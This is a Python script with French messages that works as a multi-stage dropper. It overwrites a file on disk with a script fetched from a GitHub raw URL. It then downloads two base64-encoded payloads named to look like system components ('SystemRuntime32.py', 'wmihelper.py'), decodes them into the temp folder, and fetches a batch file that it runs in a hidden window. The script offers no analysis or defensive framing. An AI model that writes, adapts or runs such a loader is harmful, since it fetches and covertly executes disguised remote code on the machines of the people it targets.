import tempfile
import os
import requests
import base64
import subprocess

def remplacer_script_clair():
    temp_dir = tempfile.gettempdir()  # Récupère vrai chemin temp
    fichier_temp = os.path.join(temp_dir, "s_path.txt")
    url_script_clair = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"  # script clair

    print(f"[i] Temp dir : {temp_dir}")
    print(f"[i] Fichier trace : {fichier_temp}")

    if not os.path.isfile(fichier_temp):
        print("[!] Le fichier s_path.txt est introuvable.")
        return False

    with open(fichier_temp, "r") as f:
        chemin_script = f.read().strip()

    print(f"[i] Chemin lu dans le fichier : {chemin_script}")

    if not os.path.isfile(chemin_script):
        print(f"[!] Fichier cible introuvable : {chemin_script}")
        return False

    try:
        print(f"[...] Téléchargement script clair depuis {url_script_clair}")
        r = requests.get(url_script_clair, timeout=10)
        if r.status_code == 200 and r.text.strip():
            with open(chemin_script, "w", encoding="utf-8") as f_script:
                f_script.write(r.text)
            print(f"[✓] Script clair mis à jour avec succès : {chemin_script}")
        else:
            print(f"[!] Échec téléchargement script clair. Code HTTP : {r.status_code}")
            return False
    except Exception as e:
        print(f"[!] Erreur téléchargement script clair : {e}")
        return False

    try:
        os.remove(fichier_temp)
        print("[✓] Fichier s_path.txt supprimé.")
    except Exception as e:
        print(f"[!] Erreur suppression s_path.txt : {e}")

    return True

def telecharger_decode_script_b64(nom_fichier, url_b64):
    temp_dir = tempfile.gettempdir()
    chemin_fichier = os.path.join(temp_dir, nom_fichier)

    print(f"[i] Téléchargement script crypté depuis : {url_b64}")
    try:
        r = requests.get(url_b64, timeout=10)
        if r.status_code == 200 and r.text.strip():
            contenu_b64 = r.text.strip()
            try:
                contenu_decode = base64.b64decode(contenu_b64).decode("utf-8")
            except Exception as e:
                print(f"[!] Erreur décodage base64 du fichier {nom_fichier} : {e}")
                return False
            with open(chemin_fichier, "w", encoding="utf-8") as f:
                f.write(contenu_decode)
            print(f"[✓] Script {nom_fichier} décodé et sauvegardé dans : {chemin_fichier}")
            return True
        else:
            print(f"[!] Échec téléchargement {nom_fichier}. Code HTTP : {r.status_code}")
            return False
    except Exception as e:
        print(f"[!] Erreur téléchargement {nom_fichier} : {e}")
        return False

def telecharger_et_lancer_compilateur():
    temp_dir = tempfile.gettempdir()
    url_bat = "https://raw.githubusercontent.com/luxamind141/installation/refs/heads/main/compiler.bat"
    chemin_bat = os.path.join(temp_dir, "compiler.bat")

    print(f"[i] Téléchargement du .bat depuis : {url_bat}")
    try:
        r = requests.get(url_bat, timeout=10)
        if r.status_code == 200 and r.text.strip():
            with open(chemin_bat, "w", encoding="utf-8") as f:
                f.write(r.text)
            print(f"[✓] .bat téléchargé dans : {chemin_bat}")
        else:
            print(f"[!] Échec téléchargement du .bat. Code HTTP : {r.status_code}")
            return False
    except Exception as e:
        print(f"[!] Erreur téléchargement du .bat : {e}")
        return False

    print("[i] Lancement du .bat en mode invisible...")

    CREATE_NO_WINDOW = 0x08000000
    try:
        subprocess.run(["cmd.exe", "/c", chemin_bat], creationflags=CREATE_NO_WINDOW, check=True)
        print("[✓] .bat lancé avec succès.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Erreur lancement du .bat : {e}")
        return False

if __name__ == "__main__":
    print("[*] Début du processus...")

    # 1) Remplacer le script clair
    ok = remplacer_script_clair()
    if not ok:
        print("[!] Impossible de remplacer le script clair, arrêt.")
        exit(1)

    # 2) Télécharger + décoder les scripts cryptés (SystemRuntime32.py et wmihelper.py)
    scripts_a_telecharger = {
        "SystemRuntime32.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
        "wmihelper.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc"
    }

    for nom, url in scripts_a_telecharger.items():
        if not telecharger_decode_script_b64(nom, url):
            print(f"[!] Échec téléchargement ou décodage de {nom}, arrêt.")
            exit(1)

    # 3) Télécharger et lancer le compilateur (.bat)
    if not telecharger_et_lancer_compilateur():
        print("[!] Échec du lancement du compilateur.")
        exit(1)

    print("[✓] Processus terminé avec succès.")
